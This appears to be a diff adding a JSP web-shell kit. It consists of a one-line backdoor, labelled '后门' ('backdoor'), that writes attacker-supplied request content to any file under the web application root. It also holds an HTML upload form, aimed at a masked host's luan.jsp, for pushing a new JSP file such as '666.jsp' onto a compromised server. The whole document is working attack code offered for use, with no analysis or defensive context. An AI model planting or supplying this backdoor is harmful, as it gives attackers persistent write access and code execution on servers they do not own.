@@ -1,0 +1,10 @@
+<%if(request.getParameter(\\\"f\\\")!=null)(new java.io.FileOutputStream(application.getRealPath(\\\"/\\\")+request.getParameter(\\\"f\\\"))).write(request.getParameter(\\\"c\\\").getBytes());%>	//后门
+
+# 保存html修改action属性url
+
+<html>
+<form action="http://***********/luan.jsp?f=666.jsp" method="post"  enctype="multipart/form-data">
+<textarea name=c cols=120 rows=10 width=45>your code</textarea><center>
+<input type=submit value="提交">
+</form>
+</html>
